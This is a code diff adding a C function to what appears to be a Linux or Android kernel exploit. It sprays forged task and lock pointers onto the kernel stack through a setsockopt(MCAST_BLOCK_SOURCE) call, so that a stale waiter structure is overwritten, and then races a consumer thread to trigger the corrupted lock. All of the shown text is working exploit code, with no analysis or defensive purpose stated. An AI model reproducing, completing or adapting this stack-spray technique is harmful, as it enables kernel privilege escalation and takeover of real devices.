@@ -662,3 +662,34 @@ void do_pselect_fake_lock_route(void) {
           calls, success, route_last_step, route_last_errno);
 }
 
+/* Multicast route: setsockopt(MCAST_BLOCK_SOURCE) copies the option buffer
+ * to the kernel stack at a fixed depth, so a profile whose window covers the
+ * stale waiter stamps it whole, tree_pc included. Profiles opt in with
+ * mcast_waiter_off. */
+void do_kernel5_fake_lock_route(void) {
+  size_t stamp_size = active_offsets->mcast_buffer_size;
+  size_t waiter_off = (size_t)active_offsets->mcast_waiter_off;
+  unsigned char stamp[stamp_size];
+  memset(stamp, 0, sizeof(stamp));
+  put64(stamp, waiter_off + active_offsets->mcast_task_offset, fake_task);
+  put64(stamp, waiter_off + active_offsets->mcast_lock_offset, fake_lock);
+  uint16_t family = AF_UNSPEC;
+  memcpy(stamp + 8, &family, sizeof(family));
+
+  int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+  if (fd < 0) { route_last_step = 60; route_last_errno = errno; return; }
+  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
+  atomic_store(&punch_consume_stop, 0); atomic_store(&main_route_delay_usec, 0);
+  errno = 0;
+  int ret = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, sizeof(stamp));
+  route_last_step = 61; route_last_errno = errno;
+  atomic_store(&punch_consume_go, 1);
+  for (int spin = 0; spin < 100000000 && atomic_load(&consumer_calls) == 0; spin++)
+    __asm__ volatile("yield" ::: "memory");
+  atomic_store(&punch_consume_go, 0);
+  while (atomic_load(&consumer_inflight)) __asm__ volatile("yield" ::: "memory");
+  close(fd);
+  if (ret == 0 || atomic_load(&consumer_success) > 0) {
+    route_last_step = 0; route_last_errno = 0;
+  }
+}
